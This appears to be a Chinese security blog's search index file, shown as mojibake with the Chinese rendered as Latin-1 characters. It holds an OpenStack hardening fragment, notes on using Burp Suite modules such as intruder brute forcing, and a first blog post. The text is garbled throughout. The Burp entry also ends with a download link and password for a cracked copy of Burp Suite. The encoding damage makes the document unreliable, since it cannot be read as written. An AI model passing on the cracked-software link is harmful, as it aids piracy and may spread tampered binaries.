æ­¤æ‰€æœ‰ç»“ç‚¹éœ€è¦è®¿é—®è¿™ä¸ªæ•°æ®åº“æœåŠ¡å™¨ã€‚ MySQLé…ç½®æ–‡ä»¶ä¸­ï¼Œé™åˆ¶è®¿é—®æœåŠ¡å™¨ï¼ŒOpenStackç”¨æˆ·è´¦æˆ·ä¸ºå”¯ä¸€æˆæƒIPåœ°å€ã€‚ ç§»é™¤ä»»ä½•ä¸éœ€è¦çš„OSç»„ä»¶å¹¶ç¡®ä¿ä½ æ‰€è®¾ç½®çš„æœåŠ¡å™¨åªæ”¯æŒé€šè¿‡SSHçš„åŸºäºå¯†é’¥çš„ç™»é™†ã€‚ é»˜è®¤MySQLå’ŒRabbitMQï¼ˆæ¶ˆæ¯æœåŠ¡å™¨ï¼‰æµé‡ä¸åŠ å¯†ã€‚å¦‚æœä½ éš”ç¦»äº†ç®¡ç†ç½‘ç»œå’Œåšå›ºçš„ä¸»æœºï¼Œè¿™å°±ä¸åº”è¯¥æ˜¯ä¸€ä¸ªå¾ˆç³Ÿç³•çš„é£é™©ã€‚å¦‚æœä½ çš„äº‘ç½‘ç»œæ˜“äºå—…æ¢ï¼ˆä¾‹å¦‚ï¼Œå®ƒå’Œå…¶ä»–æœåŠ¡å™¨å…±äº«ç½‘ç»œï¼‰ï¼Œä½ éœ€è¦åŠ å¯†æµé‡ã€‚ä½ å¯ä»¥ä½¿ç”¨OpenSSLæ¥è¿›è¡ŒMySQL å’ŒRabbitMQå¤„ç†ã€‚ï¼‰]]></content>
      <categories>
        <category>äº‘ç›¸å…³</category>
      </categories>
      <tags>
        <tag>OpenStack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å·¥å…·ç³»åˆ—ä¹‹Burpsuiteå­¦ä¹ ]]></title>
    <url>%2F2016%2F10%2F13%2F2%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹æè¿°ï¼šBurp Suite æ˜¯ç”¨äºæ”»å‡»web åº”ç”¨ç¨‹åºçš„é›†æˆå¹³å°ã€‚å¹³å°ä¸­æ‰€æœ‰å·¥å…·å…±äº«åŒä¸€robustæ¡†æ¶ï¼Œä»¥ä¾¿ç»Ÿä¸€å¤„ç†HTTPè¯·æ±‚ã€æŒä¹…æ€§ã€è®¤è¯ã€ä¸Šæ¸¸ä»£ç†ã€æ—¥å¿—è®°å½•ã€æŠ¥è­¦å’Œå¯æ‰©å±•æ€§ã€‚Burp Suiteå…è®¸æ”»å‡»è€…ç»“åˆæ‰‹å·¥å’Œè‡ªåŠ¨æŠ€æœ¯å»æšä¸¾ã€åˆ†æã€æ”»å‡»Webåº”ç”¨ç¨‹åºã€‚å…·ä½“ä½œç”¨å¦‚ï¼šHTTPæœåŠ¡ç«¯æ¥å£æµ‹è¯•ï¼›HTTPå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯é€šä¿¡æµ‹è¯•ï¼›Cookieç»Ÿè®¡åˆ†æï¼›WEBé¡µé¢çˆ¬å–ï¼›WEBå¸¸ç”¨ç¼–ç å’Œè§£ç ï¼›å­—ç¬¦ä¸²éšæœºæ€§ç®€å•åˆ†æï¼›å·®å¼‚å¯¹æ¯”åˆ†æã€‚ æ¨¡å—optionsï¼š å¯¹æ•´ä¸ªburpsuiteç®¡ç†ï¼Œå¯é€‰æ‹©è®°å½•æ—¥å¿—ã€‚comparerï¼šå¯¹æ¯”ã€‚ä»å…¶ä»–æ¨¡å—è½¬å…¥ï¼Œç”¨wordsæˆ–è€…bytesåšå¯¹æ¯”ã€‚decoderï¼šç¼–ç ã€‚encode as ç¼–ç ï¼Œdecode as è§£ç ã€‚smart decode è‡ªåŠ¨åˆ†æè§£ç ã€‚sequencerï¼šåˆ†æå­—ç¬¦çš„éšæœºæ€§ï¼Œå¦‚åˆ†æcookiereperaterï¼šé‡æ”¾intruderï¼šæ”»å‡»scannerï¼šæ‰«æspiderï¼šçˆ¬è™«proxyï¼šæ ¸å¿ƒtargetï¼šä¸ºspiderå’Œscanneræ¨¡å—è®¾ç½®ç›®æ ‡ è®¾ç½®åˆ†æåŸŸï¼Œsite map ç½‘ç«™ç»“æ„ï¼Œå›¾ã€‚alertsï¼šä¸ºburpsuiteæŠ¥é”™ï¼Œè¾“å‡ºé”™è¯¯æ—¥å¿— ProxyProxyåŠŸèƒ½ï¼š httpä»£ç†åŠŸèƒ½ï¼Œå¤„ç†httpè¯·æ±‚ï¼Œå¤„ç†httpå“åº”ã€‚interceptï¼šæ‹¦æˆªhistoryï¼šå†å²optionsï¼šè®¾ç½®&gt;&gt;proxy listeners è®¾ç½®ä»£ç† ï¼ˆintercept client requestï¼šå¯¹å®¢æˆ·ç«¯çš„è¯·æ±‚åšæ‹¦æˆª intercept server responsesï¼šå¯¹æœåŠ¡ç«¯çš„å›å¤åšæ‹¦æˆªï¼Œé»˜è®¤ä¸åšæ‹¦æˆªï¼Œéœ€è‡ªå·±æ‰“å‹¾ï¼‰response modificationï¼šä¿®æ”¹è¿”å›å€¼match and replaceï¼šè‹¥å‘ç°è¯·æ±‚æˆ–åº”ç­”ä¸­æŸäº›å­—ç¬¦ç¬¦åˆä½ è®¾ç½®çš„å­—ç¬¦åˆ™å¯ä»¥åˆ é™¤æˆ–ä¿®æ”¹ã€‚miscellaneousï¼šå…¶ä»–ã€‚interceptï¼š forwardï¼šæ”¾è¿‡ï¼Œdrop ä¸¢å¼ƒï¼Œ intercept is off ä¸åšæ‹¦æˆªã€‚history å•å‡»ä¸‹é¢æ–¹æ¡†å¯è®¾ç½®è¿‡æ»¤å™¨ã€‚interfaceï¼š å½“æœ¬åœ°ç«¯å£å·²è¢«å ç”¨ï¼Œä½¿ç”¨proxyä¸­çš„optionsä¸­çš„proxy listeneræ›´æ”¹ç«¯å£ï¼Œä¹Ÿå¯ä»¥åœ¨proxy listener ä¸­è®¾ç½®å…¶ä»–ä¸»æœºçš„IPä¸ç«¯å£è¿›è¡Œç›‘å¬Redirectï¼šè¯·æ±‚å¤„ç†ï¼Œæ›´æ”¹åŒ…çš„è®¿é—®åœ°å€ä¸ç«¯å£ã€‚å¯ä»¥é€‰æ‹©æ˜¯å¦ç”¨sslåŠ å¯†å‘é€ã€‚å½“ä½¿ç”¨sslæ—¶åªæœ‰ç½‘ç«™é‡‡ç”¨sslçš„éƒ¨åˆ†æ‰èƒ½å¾—åˆ°å›åº”ã€‚invisibleï¼šä»£ç†çš„æ ‡å‡†å³è®¾ç½®äº†ä»£ç†ä¸æœªè®¾ç½®ä»£ç†è¯·æ±‚åŒ…çš„åŒºåˆ«ã€‚certificateï¼šè¯ä¹¦ã€‚ä¸‰ä¸ªé€‰é¡¹ã€‚ä¸‹é¢æ˜¯å¯ä»¥è‡ªå·±å¯¼å…¥è¯ä¹¦ã€‚ Repeater ï¼ˆè€å¼æ­¥æªï¼Œä¸€æ¬¡ä¸€å‘ï¼‰å…ˆé€šè¿‡proxyæŠ“åŒ…ï¼Œç„¶åå°†åŒ…å‘é€åˆ°repeater å¯ä»¥é€šè¿‡é‡æ”¾ä¿®æ”¹åŒ…å¤´ä¿¡æ¯ã€‚ repeaterè®¾ç½®é¡¹åœ¨æœ€ä¸Šæ–¹ï¼Œå¯è®¾ç½®æ›´æ–°é•¿åº¦ï¼Œè§£å‹ï¼Œå¦‚æœå¯¹æ–¹é€‰æ‹©è·³è½¬æ˜¯å¦è·Ÿéšã€‚è·Ÿè¸ªcookiesï¼Œèœå•æ ã€‚åœ¨å³ä¸Šè§’æœ‰ä¸€ä¸ªtargetå¯ä»¥è®¾ç½®å‘é€ä¸»æœºä¸ç«¯å£ã€‚use HTTPS æ˜¯å¯ä»¥å°†httpè½¬æ¢æˆhttpsï¼Œå¦‚è½¬è‡³è®¿é—®æ”¯ä»˜å®ã€‚** Intruder ï¼ˆå†²é”‹æªï¼Œå¯è¿å‘ï¼‰æœ€ä¸Šæ–¹è®¾ç½®é¡¹ï¼šå¼€å§‹æ”»å‡»ï¼Œæ‰“å¼€ä¿å­˜è¿‡çš„æ”»å‡»ï¼Œä¿å­˜æ”»å‡»é…ç½®ï¼ˆä¿å­˜payloadé…ç½®ï¼‰ï¼Œæ‹·è´/ä¸‹è½½æ”»å‡»é…ç½®ï¼Œnew tab behavior æ–°å»ºçª—å£ï¼ˆï¼‰ï¼Œè‡ªåŠ¨æ”»å‡»ç‚¹ï¼ŒåŠ è½½æ•°æ®ï¼ˆå¯ä½¿ç”¨buit-in lists ä¹Ÿå¯ä»¥æ‰“å¼€è‡ªå·±çš„æ”»å‡»æ–‡æœ¬ï¼‰optionsï¼šï¼ˆè®¾ç½®â€“æ”»å‡»é¢‘ç‡ï¼Œä¿®æ”¹æ•°æ®ï¼‰ä¸repeaterå³ä¸Šè§’targetå·®ä¸å¤šã€‚Targerï¼ˆç›®æ ‡ï¼‰ï¼š positions ï¼ˆæ”»å‡»ç‚¹ï¼Œå‚æ•°ï¼‰Clear$ï¼šå…³æ‰æ‰€æœ‰æ ‡è®°çš„æ”»å‡»ç‚¹ï¼Œé€‰ä¸­æƒ³è¦æ”»å‡»çš„å‚æ•°é€‰æ‹©add$ï¼Œæˆ–è€…è¿‡é•¿çš„å‚æ•°é€‰æ‹©å¼€å§‹ç‚¹addç„¶ååœ¨å‚æ•°ç»“å°¾å†é€‰æ‹©ä¸€æ¬¡addã€‚payloadï¼ˆæ”»å‡»ç±»å‹çš„é€‰æ‹©å³å­å¼¹é€‰æ‹©ï¼‰ï¼š1ã€sniperï¼šç‹™å‡»ï¼Œå¯¹ä¸€ä¸ªå‚æ•°è¿›è¡Œæ”»å‡» payload typeï¼Œå¯ä»¥é€‰æ‹©å‚æ•°å†…å®¹ã€‚å¯¹äºæ¯ä¸€ä¸ªæ”»å‡»ç‚¹ç”¨å­˜åœ¨çš„æ”»å‡»å†…å®¹ä¾æ¬¡æŠ¡ä¸€é2ã€battering ramï¼šå¯¹å¤šä¸ªå‚æ•°è¿›è¡ŒåŒä¸€ç§æ”»å‡»3ã€pitchforkï¼šå‰å­æ¨¡å¼ï¼Œå¯è‡ªè¡Œè®¾ç½®æ”»å‡»ç‚¹çš„æ”»å‡»å†…å®¹ã€‚ä¿è¯æ¯ä¸ªæ”»å‡»ç‚¹çš„payloadæ•°é‡ç›¸åŒï¼Œå¦åˆ™é€‰ç”¨æœ€å°‘æ”»å‡»æ¬¡æ•°4ã€cluster bombï¼šè®¾ç½®ç›¸ä¼¼pitchforkï¼Œå¿…é¡»ä¸ºæ¯ä¸ªæ”»å‡»ç‚¹è®¾ç½®payloadï¼Œæ”»å‡»æ¬¡æ•°æ˜¯æ¯ä¸ªå‚æ•°çš„payloadç›¸äº’ç»„åˆå‘é€æ”»å‡»ï¼Œæ¬¡æ•°æœ€å¤š payload (æ”»å‡»é›†åˆï¼‰payload sets è®¾ç½®é›†åˆä¸ªæ•°ï¼Œå³é€‰æ‹©å‡ ä¸ªæ”»å‡»ç‚¹ï¼Œtypeå‡ ç§æ”»å‡»ç±»å‹=å­å¼¹ç§ç±»ï¼šæ•°å­—ã€simple listï¼ˆå†…ç½®çš„æ”»å‡»è¡Œåœ¨payload optionä¸­é€‰æ‹©å¦‚xssï¼‰ ç­‰ç­‰ï¼Œä¹Ÿå°±æ˜¯å­—å…¸ç”Ÿæˆå™¨runtime file é€‰æ‹©å¤§å‹å­—å…¸ numbers æ•°å­—å­—å…¸ï¼Œå¯ç”¨äºorder byã€unionè”åˆæŸ¥è¯¢ã€brute forcer æš´åŠ›ç ´è§£ï¼Œè¾“å…¥çš„å­—ç¬¦æŒ‰ä½æ•°è‡ªåŠ¨æ’åˆ—è¿›è¡Œæš´åŠ›ç ´è§£ï¼‰payload option å±•ç¤ºå­—å…¸å†…å®¹payload processing å¯¹ä½ çš„å­—å…¸è¿›è¡Œå¤„ç†ï¼Œå¼ºåŒ–å­—å…¸ã€‚ï¼ˆå¢åŠ å†…å®¹add prefix/suffix å¢åŠ å‰åç¼€ï¼Œmatch/replaceæ›¿æ¢å­—å…¸ä¸­çš„æŸäº›å­—ç¬¦ï¼Œsubstring å½“å­—å…¸ä¸­æ¯ä¸ªå­—ç¬¦ä¸²è¿‡é•¿ï¼Œå¯ä»¥æˆªå–å­—ç¬¦ä¸²ä¸­æŸå‡ ä¸ªå­—ç¬¦ï¼Œreverse substring æˆªå–ä¸­é—´å‡ ä¸ªå­—ç¬¦å€’ä¸€ä¸‹é¡ºåºï¼Œmodify case å¤§å°å†™çš„è½¬æ¢ï¼ŒEncode ç¼–ç ã€å¸¸ç”¨ã€‘ï¼‰payload encoding ä¸ºå­—å…¸è¿›è¡Œç¼–ç ã€‚ç­‰äº Encode ä¸ºå¿«é€Ÿé€‰ç”¨è€Œè®¾è®¡ã€‚ options (è®¾ç½®é¡¹)Request Headersï¼šå½“æœåŠ¡å™¨ä¸æ”¯æŒé•¿é“¾æ¥æˆ–è€…ä¸æƒ³é€ æˆé•¿é“¾æ¥å¯å‹¾é€‰ set connectionï¼šcloseupdate content-length headerï¼š è®¡ç®—åŒ…é•¿åº¦request engineï¼šnï¼ˆæ—¶é—´ä¸Šçš„è®¾ç½®ï¼Œé¢‘ç‡ï¼‰umber of threads çº¿ç¨‹æ•°number of retries on network failure è¿æ¥å¤±è´¥å é‡æ–°è¿æ¥æ¬¡æ•°pause before retryï¼ˆmillisecondï¼‰ æ¯ä¸ªåŒ…ä¹‹é—´çš„æ—¶é—´é—´éš”throttle å‘åŒ…æ—¶é—´è®¾ç½®ï¼Œstart time ç‚¹å‡»å¼€å§‹æ”»å‡»æŒ‰é’®åçš„å¯åŠ¨æ—¶é—´ï¼Œimmediate é©¬ä¸Šæ”»å‡»in__ minutes è‡ªå·±è®¾ç½®æ—¶é—´Attack results ï¼ˆæ”»å‡»ç»“æœçš„è®°å½•ï¼‰ï¼šstore requests ä»ä¸‹è¯·æ±‚ï¼Œstore respond ä»ä¸‹è¿”å›ï¼Œmake unmodifiedbaseline request å‘é€ä¸€æ¬¡æ­£å¸¸é¡µé¢åˆ¤æ–­å¯¹æ–¹æ˜¯å¦æ­£å¸¸ï¼Œä½¿ç”¨dosæ”»å‡»ï¼Œå‹åŠ›æµ‹è¯•ï¼Œä¸è®°å½•è¿”å›ç»“æœã€‚storefull payload æ˜¯å¦ä¿å­˜æ‰€æœ‰æ•°æ®Grep-matchï¼šæ·»åŠ æœç´¢å€¼ï¼Œæ‰“å‹¾åè‹¥è¿”å›æ•°æ®ä¸­å­˜åœ¨é¢„é€‰å€¼åˆ™ä¼šè¢«åˆ’é’© ï¼›case sensitive match åˆ¤æ–­åŒºåˆ†å¤§å°å†™æ˜¯å¦æ•æ„Ÿï¼›exclude http headers æ£€ç´¢ä¸åŒ…æ‹¬åŒ…å¤´ä¸­çš„æ•°æ®Grep-extractï¼šå¯¹ä¸Šé¢æ£€ç´¢çš„ä¸€ä¸ªæ‰©å±•ï¼Œæ‰“å¼€add å¯ä»¥è®¾ç½®åç§»é‡ï¼Œèƒ½æå–ä½ æƒ³çœ‹çš„ä»æŸä¸ªä½ç½®åˆ°å¦ä¸€ä¸ªä½ç½®ä¸­é—´çš„å€¼ã€‚Grep-payloadsï¼šåˆ¤æ–­æäº¤å€¼ åœ¨è¿”å›å€¼ä¸­æ˜¯å¦å­˜åœ¨æäº¤çš„å€¼â€“å¯¹XSSå¾ˆé‡è¦ï¼›åˆ¤æ–­å¤§å°å†™æ˜¯å¦æ•æ„Ÿï¼›ä¸åŒ…æ‹¬httpå¤´ï¼›ç¼–ç URL Redirection å¦‚æœå¯¹æ”¾è¿”å›ä¸€ä¸ªéœ€è¦è·³è½¬çš„è¯·æ±‚ï¼Œè®¾ç½®æ˜¯å¦è·³è½¬è¿‡å» Scanner (æ‰«ææ¨¡å—)resultsï¼šæ‰«æç»“æœï¼Œæœ‰æ¼æ´æè¿°ï¼Œä¿®å¤æ–¹å¼scan queueï¼šæ‰«æé˜Ÿåˆ—ï¼Œæ‰«æè¿›ç¨‹live scanningï¼šæ­£åœ¨è¿›è¡Œçš„æ‰«æï¼Œlive active scanning ä¸»åŠ¨æ‰«æï¼Œä¸»åŠ¨æäº¤æ•°æ®ï¼Œç„¶åæ ¹æ®è¿”å›å€¼åˆ†æå¾—å‡ºæ¼æ´ã€‚passive scanning åˆ†æåœ¨æ‰«æå†å²ä¸­çš„æ•°æ®ã€‚é»˜è®¤æ‰“å¼€ï¼Œoptionsï¼š æ‰«æè®¾ç½® attack insertion pointsï¼šURLå‚æ•°æ›´æ”¹ï¼Œurlï¼Œbodyï¼Œcookieä¸‰è€…çš„ä½ç½®å…³ç³»ã€‚å¯æ’é™¤çš„æ”»å‡»å‚æ•°ï¼ˆç¼©å°å·¥ä½œé‡ï¼‰ï¼Œactive scanning areas åŠ¨æ€æ‰«æåŒºåŸŸï¼ˆé‡‡ç”¨payloadç±»å‹ï¼‰ï¼›passive scanning areas é™æ€æ‰«æåŒºåŸŸ Options (æ•´ä½“é…ç½®)misc : å…¶ä»–hotkeys è®¾ç½®å¿«æ·é”®ï¼›logging æ—¥å¿—ï¼ˆæ—¥å¿—ä¿¡æ¯å¯ä»¥ä¼ ç»™å…¶ä»–å·¥å…·å½“åšè¾“å…¥ä½¿ç”¨ï¼‰ï¼›temporary files location ä¸´æ—¶æ–‡ä»¶ç›®å½•ï¼Œè‡ªåŠ¨å¤‡ä»½ã€‚scheduled tasks è‡ªå·±è®¾ç½®å®šæ—¶ä»»åŠ¡ï¼Œå¦‚æ‰«æï¼Œçˆ¬è¡Œç­‰ã€‚displayï¼š user interface å­—ä½“å¤§å°ä¸é£æ ¼ï¼ŒHttp Message display å¯¹http ä¿¡æ¯çš„æ•°æ®çš„è®¾ç½® character sets ç¼–ç ï¼Œè§£ç æ–¹å¼ã€‚html rendeing htmlæ¸²æŸ“ã€‚connections é“¾æ¥platform authentication æä¾›ç™»å½•é¡µé¢ï¼Œå½“æœ‰è´¦å·ä¸å¯†ç æ—¶å¯ç”¨ç”¨æ¥çˆ¬å–ç™»å½•é¡µé¢upstream proxy server ç”¨å¤–ç½‘æŸåœ°å€åšä»£ç†ã€‚èµ°httpçš„socks proxy èµ°socksä»£ç†æœåŠ¡å™¨timeout æ•´ä¸ªè½¯ä»¶çš„æ—¶é—´è®¾ç½®hostname resolution ä»¥burp suiteåšä¸€ä¸ªdnsæœåŠ¡å™¨ ç”¨äºæœ¬åœ°hostæ›´æ”¹åè½¬å‘æ•°æ®ã€‚out_of_scope requests å¤„ç†æ²¡åœ¨åŸŸå†…çš„è®¿é—®http æ•´ä¸ªè½¯ä»¶æ‰€æœ‰ä¸httpæœ‰å…³çš„é€‰é¡¹éƒ½éµå¾ªè¿™è¾¹çš„è®¾ç½®ã€‚redirections æ˜¯å¦è·³è½¬ï¼Œå“ªäº›è·³è½¬streaming response è¿›è¡Œé•¿è¿æ¥ï¼Œè®¾ç½®é•¿æ—¶é—´çš„ä»£ç†ã€‚è‡ªå·±åŠ  status 100 response å¤„ç†100è¿”å›å€¼å½“éœ€è¦postä¸€ä¸ªå¤§çš„æ•°æ®åŒ…æ—¶ä¼šå…ˆå‘é€ä¸€ä¸ª100çš„é—®å€™ï¼Œå½“æœåŠ¡ç«¯è¿”å›100åæ‰å¼€å§‹å‘é€å¤§æ•°æ®åŒ…ã€‚sslâ€“è®¾ç½®sslå±æ€§client ssl certificateï¼šå½“å–å¾—æŸç½‘ç«™è¯ä¹¦ï¼Œå¯åœ¨æ­¤å¤„ä½¿ç”¨è¯ä¹¦ã€‚å½“è®¿é—®ä¸€ä¸ªå­˜åœ¨sslåŠ å¯†çš„ç½‘å€æ—¶å°†è¯ä¹¦å­˜æ”¾åœ¨server SSL certificate (è¯ä¹¦åˆ—ï¼‰ä¸­.ssl negotiationï¼šè¿›è¡Œåè®®çš„é€‰æ‹©sessionsï¼šä¿å­˜sessionsä¿¡æ¯ spider (çˆ¬è™«)optionsï¼š crawler setting è®¾ç½®çˆ¬æ‰¾å“ªäº›ä¸œè¥¿ã€‚form submission è‡ªåŠ¨åŒ¹é…çˆ¬å–åˆ°çš„æ•°æ®ã€‚request headers è®¾ç½®çˆ¬è™«å¤´ã€‚control çˆ¬è™«èŒƒå›´ æ€»ç»“burpsuiteå¯ä»¥è¯´æ˜¯WEBæµ‹è¯•å¿…å¤‡ç¥å™¨ä¹‹ä¸€ï¼ŒåŠŸèƒ½å¼ºå¤§ã€‚å…¶ä»–ä»‹ç»å¯ä»¥å‚è€ƒï¼šhttp://www.nxadmin.com/tools/689.htmlhttps://portswigger.net/burp/download.html.. å¦å¤–ï¼Œåˆ†äº«ä¸€ä¸ªæˆ‘æ‰‹ä¸­æœ€æ–°ç ´è§£ç‰ˆçš„burpsuitâ€“1.7.08ï¼šhttp://pan.baidu.com/s/1dFsU0JR å¯†ç ï¼šl3nl]]></content>
      <categories>
        <category>ç¥å™¨</category>
      </categories>
      <tags>
        <tag>Burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¤ªåˆ]]></title>
    <url>%2F2016%2F10%2F08%2F1%2F</url>
    <content type="text"><![CDATA[å¼€å§‹ä¸çŸ¥é“ä¸ºå•¥ï¼Œåœ¨å†™ç¬¬ä¸€ç¯‡åšæ–‡çš„æ—¶å€™çªç„¶æƒ³èµ·å°å­¦è€å¸ˆæ•™å†™æ—¥è®°çš„æƒ…æ™¯ï¼Œå‡ åº¦æ˜¥ç§‹å¼¹æŒ‡å³é€ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚å”¯ä¸€ä¸å˜çš„è¿˜æ˜¯è¿™ä¹ˆlow~~~ æ—¥å¸¸å¹³å¸¸æ¸¸è¡åœ¨å„ä½å¤§ä½¬ï¼Œå¸ˆå‚…ï¼Œè¡¨å“¥çš„åšå®¢ã€‚åœ¨å…¶ä¸­å–ç»ï¼Œå­¦ä¹ ï¼Œè™½ç„¶æ²¡æœ‰è¯„è®ºï¼Œä½†æ˜¯å‘è‡ªå†…å¿ƒçš„ä½©æœä¸æ„Ÿè°¢ã€‚åœ¨çœ‹å®Œ&lt;&lt;æ€æ ·èŠ±ä¸¤å¹´æ—¶é—´å»é¢è¯•ä¸€ä¸ªäºº&gt;&gt;å’ŒGabriel Weinbergçš„åšæ–‡ã€ŠWhy I blogã€‹ä¹‹åï¼Œå†…å¿ƒå°±èŒå‘äº†åˆ›å»ºä¸ªäººåšå®¢çš„å†²åŠ¨ï¼Œå†åŠ ä¸Šå¹³å¸¸ç¬”è®°æ¯”è¾ƒæ¾æ•£ï¼Œä¸æ–¹ä¾¿æŸ¥é˜…ï¼Œæœ‰æ—¶å€™é‡åˆ°é—®é¢˜ï¼Œè§£å†³åå‡ å¤©è¿˜æœ‰å°è±¡ï¼Œä½†æ˜¯æ—¶é—´ä¸€é•¿ï¼Œåˆå¿˜äº†ï¼Œä¹Ÿè®¸ä¸‹ä¸€æ¬¡é‡åˆ°åŒæ ·çš„é—®é¢˜ï¼Œåˆå¾—æµªè´¹æ—¶é—´ã€‚æƒ³èµ·é»‘å®¢ä¿¡æ¡ï¼šä¸–ç•Œå……æ»¡äº†å¾…è§£å†³çš„è¿·äººé—®é¢˜ã€‚ä¸€ä¸ªé—®é¢˜ä¸åº”è¯¥è¢«è§£å†³ä¸¤æ¬¡ã€‚æ— èŠå’Œä¹å‘³çš„å·¥ä½œæ˜¯ç½ªæ¶ã€‚è‡ªç”±ä¸‡å²ã€‚æ€åº¦ä¸èƒ½æ›¿ä»£èƒ½åŠ›ã€‚è¶Šå‘è§‰å¾—è‡ªå·±ä¹Ÿæœ‰å¿…è¦æŒ‰æ—¶æ•´ç†ç¬”è®°ï¼Œå¹¶è®°å½•åœ¨åšå®¢ä¸­ã€‚äºå·±äºäººéƒ½æ˜¯ä¸€ä»¶é•¿ä¹…æœ‰ç›Šçš„äº‹æƒ…ã€‚è¿™ä¸ªåšå®¢åœ¨å…«æœˆä»½å°±å·²ç»æ­å»ºå¹¶å¤‡æ¡ˆå®Œæ¯•ï¼Œè¿˜æ˜¯æŒºæ„Ÿè°¢æ¸…é£å’Œmonburançš„ï¼Œè¿˜æœ‰é»‘é¸Ÿï¼Œå»ºç«™ç»å†ç½‘ä¸Šå¾ˆå¤šäººéƒ½æ€»ç»“å‡ºæ¥äº†ï¼Œæˆ‘å°±ä¸å†ç´¯èµ˜äº†ã€‚ æ„¿æ™¯å…ˆæŠŠä¸€äº›å·²ç»è®°å½•çš„ç¬”è®°å‘å‡ºæ¥ï¼Œä¹‹åå°±æ•´ç†å­¦ä¹ è¿‡ç¨‹ä¸­çš„æ”¶è·ä¸çŒ¥çç»éªŒä»¥åŠå…¶ä»–èµ„æºã€‚å¸Œæœ›èƒ½åšæŒä¸‹å»ï¼Œè¶Šèµ°è¶Šè¿œï¼Œï¼Œï¼Œï¼ŒTHE END â€“To follow the path: (æ²¿ç€è¿™æ ·ä¸€æ¡é“è·¯ï¼š)Look to the master, (å¯»æ‰¾å¤§å¸ˆï¼Œ)Follow the master, (è·Ÿéšå¤§å¸ˆï¼Œ)Walk with the master, (ä¸å¤§å¸ˆé€šè¡Œï¼Œ)See through the master, (æ´å¯Ÿå¤§å¸ˆï¼Œ)Become the master. (æˆä¸ºå¤§å¸ˆã€‚)]]></content>
      <categories>
        <category>å²æœˆ</category>
      </categories>
      <tags>
        <tag>ç”Ÿæ´»</tag>
      </tags>
  </entry>
</search>
